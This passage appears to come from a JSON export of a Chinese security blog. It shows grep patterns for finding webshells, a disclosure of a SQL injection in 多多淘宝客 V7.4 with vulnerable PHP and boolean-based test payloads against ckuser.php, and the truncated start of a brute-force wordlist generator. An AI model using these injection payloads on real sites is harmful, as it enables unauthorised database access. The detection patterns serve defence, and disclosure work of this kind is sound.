title=\"3\"></a></p>\n<p>以上两个简单的例子可以做为白盒挖掘漏洞的参考，下面介绍一下查找webshell和其他恶意文件的方法：</p>\n<p>常见的webshell都会包含一些功能，如执行命令、下载文件、编辑文件、反弹连接等行为。</p>\n<p>除了常见的shell_exec，base64_decode和eval，还有其他的一些特征码，比如phpspy2006中会包含“Version:2006,proxycontents”，phpspy2008中会包含“phpspypass,goaction(‘backconnect”等等。</p>\n<p>还有以下一些常见的特征：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">phpinfo</div><div class=\"line\">system</div><div class=\"line\">php_uname</div><div class=\"line\">chmod</div><div class=\"line\">fopen</div><div class=\"line\">flclose</div><div class=\"line\">readfile</div><div class=\"line\">edoced_46esab</div><div class=\"line\">passthru</div></pre></td></tr></table></figure>\n\n<p>我们可以用grep搜索包含这些函数的文件，如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “shell_exec *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “base64_decode *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “phpinfo *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “system *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “php_uname *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “chmod *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “fopen *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “fclose *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “readfile *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “edoced_46esab *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “eval *(” <span class=\"regexp\">/var/</span>www</div><div class=\"line\"><span class=\"keyword\">grep</span> -Rn “passthru *(” <span class=\"regexp\">/var/</span>www</div></pre></td></tr></table></figure>\n\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/4.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/4.png\" alt=\"\" title=\"4\"></a></p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/5.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/5.png\" alt=\"\" title=\"5\"></a></p>\n<p>当然这些可以合并成一条命令，如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">grep</span> -RPn “(passthru|shell_exec|<span class=\"built_in\">system</span>|phpinfo|base64_decode|chmod|<span class=\"built_in\">mkdir</span>|fopen|fclose|<span class=\"built_in\">readfile</span>|php_uname|<span class=\"built_in\">eval</span>|tcpflood|udpflood|edoced_46esab) *(” /var/www</div></pre></td></tr></table></figure>\n\n<p>本文转载于： <a href=\"http://www.freebuf.com/articles/4074.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/4074.html</a></p>\n","source":"_posts/利用grep查找webshell.md","raw":"title: \"Linux下利用grep查找webshell\"\nid: 21\ndate: 2012-07-01 02:22:58\ntags: \n- webshell\n- 后门\ncategories: \n- 技术文章\n---\n\n## WEB SHELL 排查\ngrep （global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。Unix的grep家族包括grep、egrep和fgrep。**\n\n利用grep命令我们可以查找常见的漏洞、webshell和其他恶意文件。本文使用的grep版本为2.9，如果你使用一个低于2.5.4的grep，那本片文章中的一些命令可能无法正常工作。可以用grep -v或grep -version确定一下版本。你也可以使用grep –help查看更多信息。如下图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/1.png \"1\")](http://asset.creturn.com/asset/uploads/2012/07/1.png)\n<!--more-->\n##发现漏洞的常见方法：\n\n为什么大多数web应用程序都会发现一些不安全的代码，就是因为调用了一些不安全的函数，而又未进行过滤。例如：命令注入或远程代码执行，可以执行客户端传递的参数。这里常常会用到shell_exec函数。我们可以用grep命令搜索文件中存在shell_exec函数的地方，如下：\n\n```shell\ngrep -Rn “shell_exec *( ” /var/www\n```\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/2.png \"2\")](http://asset.creturn.com/asset/uploads/2012/07/2.png)\n\n上图中，我们可以看到可能存在漏洞的函数行和路径。\n\n另一个例子：\n\ninclude require include_once和require_once都是可能存在问题的地方，它可能会造成本地文件包含漏洞。\n\n我们可以使用grep查找出现该函数的地方然后进行测试判断，如下:\n\n```shell\ngrep -Rn “include *(” /var/www\ngrep -Rn “require *(” /var/www\ngrep -Rn “include_once *(” /var/www\ngrep -Rn “require_once *(” /var/www\n```\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/3.png \"3\")](http://asset.creturn.com/asset/uploads/2012/07/3.png)\n\n以上两个简单的例子可以做为白盒挖掘漏洞的参考，下面介绍一下查找webshell和其他恶意文件的方法：\n\n常见的webshell都会包含一些功能，如执行命令、下载文件、编辑文件、反弹连接等行为。\n\n除了常见的shell_exec，base64_decode和eval，还有其他的一些特征码，比如phpspy2006中会包含“Version:2006,proxycontents”，phpspy2008中会包含“phpspypass,goaction(‘backconnect”等等。\n\n还有以下一些常见的特征：\n\n```php\nphpinfo\nsystem\nphp_uname\nchmod\nfopen\nflclose\nreadfile\nedoced_46esab\npassthru\n```\n\n我们可以用grep搜索包含这些函数的文件，如下：\n\n```shell\ngrep -Rn “shell_exec *(” /var/www\ngrep -Rn “base64_decode *(” /var/www\ngrep -Rn “phpinfo *(” /var/www\ngrep -Rn “system *(” /var/www\ngrep -Rn “php_uname *(” /var/www\ngrep -Rn “chmod *(” /var/www\ngrep -Rn “fopen *(” /var/www\ngrep -Rn “fclose *(” /var/www\ngrep -Rn “readfile *(” /var/www\ngrep -Rn “edoced_46esab *(” /var/www\ngrep -Rn “eval *(” /var/www\ngrep -Rn “passthru *(” /var/www\n```\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/4.png \"4\")](http://asset.creturn.com/asset/uploads/2012/07/4.png)\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/5.png \"5\")](http://asset.creturn.com/asset/uploads/2012/07/5.png)\n\n当然这些可以合并成一条命令，如下：\n\n```shell\ngrep -RPn “(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab) *(” /var/www\n```\n\n本文转载于： http://www.freebuf.com/articles/4074.html\n","slug":"利用grep查找webshell","updated":1421659126000,"excerpt":"<h2 id=\"WEB_SHELL_排查\">WEB SHELL 排查</h2>\n<p>grep （global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。Unix的grep家族包括grep、egrep和fgrep。**</p>\n<p>利用grep命令我们可以查找常见的漏洞、webshell和其他恶意文件。本文使用的grep版本为2.9，如果你使用一个低于2.5.4的grep，那本片文章中的一些命令可能无法正常工作。可以用grep -v或grep -version确定一下版本。你也可以使用grep –help查看更多信息。如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/1.png\" alt=\"\" title=\"1\"></a><br>","_id":"dzpwot7lhoo9y3v8","comments":true,"layout":"post","photos":[],"link":""},{"title":"多多淘宝客V7.4 注入漏洞","id":59,"date":1341118128000,"tags":["9kgwqxdb0vysi0ew"],"categories":["kqfzjvir5hpg7mge"],"content":"<p>渗透一个站时 搞C段碰到的一个站。由于程序是开源程序</p>\n<p>并下载其程序看了一番。其实程序员还是有一点安全意识的：</p>\n<p>防注入代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//要过滤的非法字符</span></div><div class=\"line\"><span class=\"variable\">$ArrFiltrate</span> = <span class=\"keyword\">array</span> (</div><div class=\"line\"> &quot;<span class=\"comment\">#union#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;script#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#/script&gt;#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#select#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#alert#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#javascript#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;table#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;td#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&quot;#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#'#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#delete#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#vbscript#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#applet#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#frame#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;div#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#update#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#'#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#union #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#select #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#delete #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#update #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#and #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#;#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#update#i&quot;</span></div><div class=\"line\">);</div><div class=\"line\"><span class=\"variable\">$replacements</span>=<span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">FunStringExist</span><span class=\"params\">(&amp;<span class=\"variable\">$array</span>,<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>)</span></span></div><div class=\"line\">{</div><div class=\"line\"> <span class=\"keyword\">if</span> (is_array(<span class=\"variable\">$array</span>))</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"keyword\">foreach</span> (<span class=\"variable\">$array</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>)</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"keyword\">if</span> (is_array(<span class=\"variable\">$value</span>))</div><div class=\"line\"> FunStringExist(<span class=\"variable\">$array</span>[<span class=\"variable\">$key</span>],<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>);</div><div class=\"line\"> <span class=\"keyword\">else</span></div><div class=\"line\"> <span class=\"variable\">$array</span>[<span class=\"variable\">$key</span>] = preg_replace(<span class=\"variable\">$ArrFiltrate</span>, <span class=\"variable\">$replacements</span>, <span class=\"variable\">$value</span>);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">FunStringExist(<span class=\"variable\">$_GET</span>,<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>);</div><div class=\"line\">FunStringExist(<span class=\"variable\">$_POST</span>,<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>);</div></pre></td></tr></table></figure>\n\n<p><a id=\"more\"></a><br>这段代码多少还是有瑕疵的、只过滤get post 我们只要找调用request的地方</p>\n<p>别一个文件并没有调用防注入程序，导致字符注入、但受gpc影响</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">header(&quot;Content-Type:text/html;charset=utf-<span class=\"number\">8</span>&quot;);</div><div class=\"line\"> <span class=\"keyword\">include</span> &quot;../comm/config.php&quot;;</div><div class=\"line\"> <span class=\"variable\">$uname</span> = trim(<span class=\"variable\">$_GET</span>[&quot;name&quot;]);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$uname</span>==<span class=\"string\">''</span>){</div><div class=\"line\"> <span class=\"keyword\">echo</span> &quot;<span class=\"keyword\">true</span>&quot;;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$con</span> = @mysql_connect(&quot;<span class=\"variable\">$dbserver</span>&quot;,&quot;<span class=\"variable\">$dbuser</span>&quot;,&quot;<span class=\"variable\">$dbpass</span>&quot; )<span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(ERR_DB);</div><div class=\"line\"> mysql_select_db(&quot;<span class=\"variable\">$dbname</span>&quot;,<span class=\"variable\">$con</span>)<span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(&quot;can not choose the dbname!&quot;);</div><div class=\"line\"> <span class=\"variable\">$query</span>=&quot;select * from &quot;.<span class=\"variable\">$BIAOTOU</span>.&quot;user where ddusername=<span class=\"string\">'&quot;.$uname.&quot;'</span>&quot;;</div><div class=\"line\"> mysql_query(&quot;set names utf8&quot;);</div><div class=\"line\"> <span class=\"variable\">$res</span>=mysql_query(<span class=\"variable\">$query</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(mysql_num_rows(<span class=\"variable\">$res</span>)!=<span class=\"number\">0</span>)</div><div class=\"line\"> {<span class=\"keyword\">echo</span> &quot;<span class=\"keyword\">true</span>&quot;;}</div><div class=\"line\"> <span class=\"keyword\">else</span></div><div class=\"line\"> {<span class=\"keyword\">echo</span> &quot;<span class=\"keyword\">false</span>&quot;;}</div><div class=\"line\"> }</div><div class=\"line\"></div><div class=\"line\">首先注册一个用户.让程序能过判断</div><div class=\"line\">ckuser.php?name=maxadd<span class=\"string\">' and 1=1 and '</span><span class=\"string\">'='</span></div><div class=\"line\">返回 <span class=\"keyword\">true</span></div><div class=\"line\"></div><div class=\"line\">ckuser.php?name=maxadd<span class=\"string\">' and 1=2 and '</span><span class=\"string\">'='</span></div><div class=\"line\">返回 <span class=\"keyword\">false</span></div></pre></td></tr></table></figure>\n\n<p>本文转载：<a href=\"http://hi.baidu.com/0x7362/blog\" target=\"_blank\" rel=\"external\">http://hi.baidu.com/0x7362/blog</a></p>\n","source":"_posts/多多淘宝客v7-4-注入漏洞.md","raw":"title: \"多多淘宝客V7.4 注入漏洞\"\nid: 59\ndate: 2012-07-01 12:48:48\ntags: \n- 淘宝客漏洞\ncategories: \n- 最新漏洞\n---\n\n渗透一个站时 搞C段碰到的一个站。由于程序是开源程序\n\n并下载其程序看了一番。其实程序员还是有一点安全意识的：\n\n防注入代码：\n\n```php\n//要过滤的非法字符\n$ArrFiltrate = array (\n &quot;#union#i&quot;,\n &quot;#&lt;script#i&quot;,\n &quot;#/script&gt;#i&quot;,\n &quot;#select#i&quot;,\n &quot;#alert#i&quot;,\n &quot;#javascript#i&quot;,\n &quot;#&lt;table#i&quot;,\n &quot;#&lt;td#i&quot;,\n &quot;#&quot;#i&quot;,\n &quot;#'#i&quot;,\n &quot;#delete#i&quot;,\n &quot;#vbscript#i&quot;,\n &quot;#applet#i&quot;,\n &quot;#frame#i&quot;,\n &quot;#&lt;div#i&quot;,\n &quot;#update#i&quot;,\n &quot;#'#i&quot;,\n &quot;#union #i&quot;,\n &quot;#select #i&quot;,\n &quot;#delete #i&quot;,\n &quot;#update #i&quot;,\n &quot;#and #i&quot;,\n &quot;#;#i&quot;,\n &quot;#update#i&quot;\n);\n$replacements='';\n\nfunction FunStringExist(&amp;$array,$ArrFiltrate,$replacements)\n{\n if (is_array($array))\n {\n foreach ($array as $key =&gt; $value)\n {\n if (is_array($value))\n FunStringExist($array[$key],$ArrFiltrate,$replacements);\n else\n $array[$key] = preg_replace($ArrFiltrate, $replacements, $value);\n }\n }\n}\n\nFunStringExist($_GET,$ArrFiltrate,$replacements);\nFunStringExist($_POST,$ArrFiltrate,$replacements);\n```\n<!--more-->\n这段代码多少还是有瑕疵的、只过滤get post 我们只要找调用request的地方\n\n别一个文件并没有调用防注入程序，导致字符注入、但受gpc影响\n\n```php\n\nheader(&quot;Content-Type:text/html;charset=utf-8&quot;);\n include &quot;../comm/config.php&quot;;\n $uname = trim($_GET[&quot;name&quot;]);\n if($uname==''){\n echo &quot;true&quot;;\n }else{\n $con = @mysql_connect(&quot;$dbserver&quot;,&quot;$dbuser&quot;,&quot;$dbpass&quot; )or die(ERR_DB);\n mysql_select_db(&quot;$dbname&quot;,$con)or die(&quot;can not choose the dbname!&quot;);\n $query=&quot;select * from &quot;.$BIAOTOU.&quot;user where ddusername='&quot;.$uname.&quot;'&quot;;\n mysql_query(&quot;set names utf8&quot;);\n $res=mysql_query($query);\n if(mysql_num_rows($res)!=0)\n {echo &quot;true&quot;;}\n else\n {echo &quot;false&quot;;}\n }\n\n首先注册一个用户.让程序能过判断\nckuser.php?name=maxadd' and 1=1 and ''='\n返回 true\n\nckuser.php?name=maxadd' and 1=2 and ''='\n返回 false\n```\n\n本文转载：http://hi.baidu.com/0x7362/blog\n","slug":"多多淘宝客v7-4-注入漏洞","updated":1421659126000,"excerpt":"<p>渗透一个站时 搞C段碰到的一个站。由于程序是开源程序</p>\n<p>并下载其程序看了一番。其实程序员还是有一点安全意识的：</p>\n<p>防注入代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//要过滤的非法字符</span></div><div class=\"line\"><span class=\"variable\">$ArrFiltrate</span> = <span class=\"keyword\">array</span> (</div><div class=\"line\"> &quot;<span class=\"comment\">#union#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;script#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#/script&gt;#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#select#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#alert#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#javascript#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;table#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;td#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&quot;#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#'#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#delete#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#vbscript#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#applet#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#frame#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#&lt;div#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#update#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#'#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#union #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#select #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#delete #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#update #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#and #i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#;#i&quot;,</span></div><div class=\"line\"> &quot;<span class=\"comment\">#update#i&quot;</span></div><div class=\"line\">);</div><div class=\"line\"><span class=\"variable\">$replacements</span>=<span class=\"string\">''</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">FunStringExist</span><span class=\"params\">(&amp;<span class=\"variable\">$array</span>,<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>)</span></span></div><div class=\"line\">{</div><div class=\"line\"> <span class=\"keyword\">if</span> (is_array(<span class=\"variable\">$array</span>))</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"keyword\">foreach</span> (<span class=\"variable\">$array</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>)</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"keyword\">if</span> (is_array(<span class=\"variable\">$value</span>))</div><div class=\"line\"> FunStringExist(<span class=\"variable\">$array</span>[<span class=\"variable\">$key</span>],<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>);</div><div class=\"line\"> <span class=\"keyword\">else</span></div><div class=\"line\"> <span class=\"variable\">$array</span>[<span class=\"variable\">$key</span>] = preg_replace(<span class=\"variable\">$ArrFiltrate</span>, <span class=\"variable\">$replacements</span>, <span class=\"variable\">$value</span>);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">FunStringExist(<span class=\"variable\">$_GET</span>,<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>);</div><div class=\"line\">FunStringExist(<span class=\"variable\">$_POST</span>,<span class=\"variable\">$ArrFiltrate</span>,<span class=\"variable\">$replacements</span>);</div></pre></td></tr></table></figure>\n\n<p>","_id":"wegkktr56305qmol","comments":true,"layout":"post","photos":[],"link":""},{"title":"字典生成工具之排列组合","id":80,"date":1341124537000,"tags":[],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>这个工具还是前几天玩那个hackGame游戏写的，当时游戏需要组合一个字典进行爆破，但是当时手里没有字典生成工具，另外一个原因是题目的要求基本上市面上见到的那些基本完成不了需求，所以就只能自己写了。</p>\n<p>字典的功能是 在’f4ck ‘字符加上0-9组成五位数字的随机密码。</p>\n<p>还是上代码先Python的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#coding: utf-8</span></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\">Created on 2012-6-28</div><div class=\"line\"></div><div class=\"line\">@author: Return</div><div class=\"line\">'''</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#===============================================================================</span></div><div class=\"line\"><span class=\"comment\"># runk_list 对数据进行排列组合</span></div><div class=\"line\"><span class=\"comment\">#===============================================================================</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">runk_list</span><span class=\"params\">(seq)</span>:</span></div><div class=\"line\"> seqn = [seq.pop()]</div><div class=\"line\"> <span class=\"keyword\">while</span> seq:</div><div class=\"line\"> newseq = []</div><div class=\"line\"> new = seq.pop()</div><div class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(seqn)):</div><div class=\"line\"> item = seqn[i]</div><div class=\"line\"> <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(len(item)+<span class=\"number\">1</span>):</div><div class=\"line\"> newseq.append(<span class=\"string\">''</span>.join([item[:j],new,item[j:]]))</div><div class=\"line\"> seqn = newseq</div><div class=\"line\"> <span class=\"keyword\">return</span> seqn</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#===============================================================================</span></div><div class=\"line\"><span class=\"comment\"># out_file 进行文件输出操作</span></div><div class=\"line\"><span class=\"comment\">#===============================================================================</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">out_file</span><span class=\"params\">(pwdList)</span>:</span></div><div class=\"line\"> fileName = <span class=\"string\">'third_pwd.txt'</span></div><div class=\"line\"> fp = open(fileName,<span class=\"string\">'a'</span>)</div><div class=\"line\"> <span class=\"keyword\">for</span> pwd <span class=\"keyword\">in</span> pwdList:</div><div class=\"line\"> fp.write(pwd+<span class=\"string\">'n'</span>)</div><div class=\"line\"> fp.close()</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#===============================================================================</span></div><div class=\"line\"><span class=\"comment\"># factory_list 加工需要排列组合的数据</span></div><div class=\"line\"><span class=\"comment\">#===============================================================================</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">factory_list</span><span class=\"params\">()</span>:</span></div><div class=\"line\"> key = [<span class=\"string\">'f'</span>,<span class=\"string\">'9'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'k'</span>] <span class=\"comment\">#固定字符</span></div><div class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>): <span class=\"comment\">#密码(0-9)+key五位随机生成新key后进行排列组合</span></div><div class=\"line\"> newKey = key[:]</div><div class=\"line\"> newKey.append(str(i))</div><div class=\"line\"> newRunk = runk_list(newKey)</div><div 